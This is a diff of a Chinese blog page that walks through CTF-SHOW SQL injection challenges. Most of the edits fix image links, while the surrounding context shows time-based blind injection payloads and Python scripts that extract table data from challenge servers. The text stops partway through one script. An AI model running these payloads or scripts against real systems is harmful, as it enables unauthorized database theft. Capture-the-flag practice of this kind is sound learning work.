@@ -13,34 +13,59 @@
 <meta property="og:site_name" content="RacerZ">
 <meta property="og:description" content="CTF-SHOW SQL 做题记录 盲注 1$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &amp;#x27;&amp;#123;$username&amp;#125;&amp;#x27;&quot;;  回显点：密码错误与用户名不存在 过滤 1preg_match(&amp;#x27;&#x2F;file|into|ascii&#x2F;i&amp;#x27;, $username)  绕">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220821010336365.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220822123554567.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220828125029627.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220828173629345.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220828221658391.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220829204641616.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220829221912523.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220829224021570.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220831230413007.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220901092843388.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220901171756099.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220902164825092.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220902195304990.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220902203422524.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220902203730588.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220904000411089.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220904000757048.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220904001223713.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220904094042843.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220904094746919.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220904094832405.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220904095754985.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220818192902086.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821000503093.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821002449867.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821010336365.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821011728324.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220822123554567.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828125029627.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828173629345.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828174052474.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828221658391.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829203146986.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829204641616.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829215532144.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829220430918.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829220448528.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829221912523.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829224021570.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831222751226.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831222707507.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831224759340.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831230413007.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831231356971.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831235747598.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901090838288.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901092843388.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901092913176.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901145550324.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901145557375.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901171714517.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901171756099.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902164638250.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902164825092.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902172059797.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902195304990.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902195411798.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902203422524.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902203730588.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904000411089.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904000757048.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904001223713.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094011826.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094042843.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094728417.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094746919.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094832405.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904095426729.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904095754985.png">
 <meta property="article:published_time" content="2022-09-07T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-09-08T16:23:14.662Z">
+<meta property="article:modified_time" content="2022-09-08T16:30:20.521Z">
 <meta property="article:author" content="RacerZ">
 <meta property="article:tag" content="ctfshow">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java%20Sec/代码审计/OWASP/img/image-20220821010336365.png">
+<meta name="twitter:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220818192902086.png">
     
     
       
@@ -225,18 +250,18 @@
 <li><p>sqlmap 在之前的基础上加上cookie的数据</p>
 </li>
 <li><p>sqlmap 需要鉴权 可以看到在访问api之前还需要去请求一个getToken页面，所以利用sqlmap设置好注入测试期间需要访问的页面及次数</p>
-<p>![image-20220818192902086](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220818192902086.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220818192902086.png" alt="image-20220818192902086"></p>
 </li>
 <li><p>时间盲注</p>
 <p>主要是找注入点比较难搞，不知道他们咋找到的参数</p>
-<p>![image-20220821000503093](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220821000503093.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821000503093.png" alt="image-20220821000503093"></p>
 </li>
 </ol>
 <p>POC and 好像被过滤了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=-1 or if(1=1,sleep(3),1)%23</span><br></pre></td></tr></table></figure>
 
 <p>这里还学到了写脚本当中request方法中的timeout参数，超时则会抛出异常</p>
-<p>![image-20220821002449867](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220821002449867.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821002449867.png" alt="image-20220821002449867"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a6530d33-5713-4b2d-aff5-b818b24742ea.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        <span class="comment">#payload = &quot;select version()&quot;  </span></span><br><span class="line">        <span class="comment">#payload = &quot;select database()&quot; </span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot; </span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_flagx&#x27;&quot;   </span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(flaga) from ctfshow_flagx&quot;</span> </span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;if((ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>),sleep(1),1)&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
 
 <ol start="215">
@@ -251,9 +276,9 @@
 <p>想明白了语句应该是这样</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from ctfshow_info where id=from_base64($ip);</span><br></pre></td></tr></table></figure>
 
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220821010336365.png" alt="image-20220821010336365" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821010336365.png" alt="image-20220821010336365" style="zoom:50%;">
 
-<p>![image-20220821011728324](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220821011728324.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821011728324.png" alt="image-20220821011728324"></p>
 <p>刚开始想的直接把整个注入语句进行编码就行。但是不太行，应该是它这个参数换了的原因…。所以就沿用闭合语句的方式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=&#x27;&#x27;) or if(1=(select 1),sleep(3),1)#</span><br></pre></td></tr></table></figure>
 
@@ -261,7 +286,7 @@
 <li><p>时间盲注</p>
 <p>语句闭合采用括号的形式，sleep函数终于也被ban了。试试新的benchmark</p>
 <p><code>执行表达式exp，count次（消耗CPU）</code></p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220822123554567.png" alt="image-20220822123554567" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220822123554567.png" alt="image-20220822123554567" style="zoom:50%;">
 
 <p>POC</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1) or if(1=2, benchmark(1000000, md5(1)), 1)</span><br></pre></td></tr></table></figure></li>
@@ -273,7 +298,7 @@
 
 
 
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220828125029627.png" alt="image-20220828125029627" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828125029627.png" alt="image-20220828125029627" style="zoom:50%;">
 
 <p>POC</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1) or if(1=2, (select count(*) from information_schema.columns A,information_schema.columns B), 1)#</span><br></pre></td></tr></table></figure></li>
@@ -295,15 +320,15 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1) or if(1=2, (select count(*) from information_schema.columns A,information_schema.columns B), 1)#</span><br></pre></td></tr></table></figure>
 
 <p>时间参数真的难调，最后合并一下才能提交</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220828173629345.png" alt="image-20220828173629345" style="zoom:50%;"></li>
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828173629345.png" alt="image-20220828173629345" style="zoom:50%;"></li>
 <li><p>时间盲注 这次过滤了前面用到的一大截包括字符串截取函数</p>
-<p>![image-20220828174052474](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220828174052474.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828174052474.png" alt="image-20220828174052474"></p>
 </li>
 </ol>
 <p>依照上一个笛卡尔积的脚本，我们作相关函数的替换</p>
 <p><code>ascii</code>替换为字符串匹配，<code>substr</code>替换为<code>left</code>，<code>group_concat</code>的话用<code>limit</code>慢慢出</p>
 <p>太不容易了淦</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220828221658391.png" alt="image-20220828221658391" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828221658391.png" alt="image-20220828221658391" style="zoom:50%;">
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;http://63e8e9cb-226f-4b44-8f90-c4ef31182595.challenge.ctf.show/api/&quot;</span></span><br><span class="line">db = <span class="string">&#x27;0123456789abcdef-&#123;&#125;,_&#x27;</span></span><br><span class="line">result = <span class="string">&quot;ctfshow&#123;fcba847d-bf3b-4f6a-942b&quot;</span> </span><br><span class="line"><span class="comment"># 4f6a-942b-0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> db:</span><br><span class="line">        <span class="comment">#payload = &quot;select version()&quot; ctfshow_flagxca,ctfshow_info</span></span><br><span class="line">        <span class="comment">#payload = &quot;select column_name from information_schema.columns where table_name = &#x27;ctfshow_flagxcac&#x27; limit 1,1&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;select table_name from information_schema.tables where table_schema = database() limit 0, 1&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaabcc from ctfshow_flagxcac limit 0, 1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>:<span class="string">f&quot;1) or if((<span class="subst">&#123;payload&#125;</span>) like &#x27;<span class="subst">&#123;result+s&#125;</span>%&#x27;, (select count(*) from information_schema.columns A,information_schema.columns B), 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        result += s</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">0.3</span>) </span><br><span class="line">            result = result[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">if</span> result[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
@@ -321,12 +346,12 @@
 <li><p>group by注入</p>
 <p>应该是和order by注入差不多，可以直接利用盲注，username和id字段的回显就不一样。</p>
 <p>至于如何寻找的字段</p>
-<p>![image-20220829203146986](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220829203146986.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829203146986.png" alt="image-20220829203146986"></p>
 <p><strong>exp</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> result</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 1199 252</span></span><br><span class="line">url = <span class="string">&quot;http://24b1d804-1f69-4732-89d1-6a70e05693ad.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span 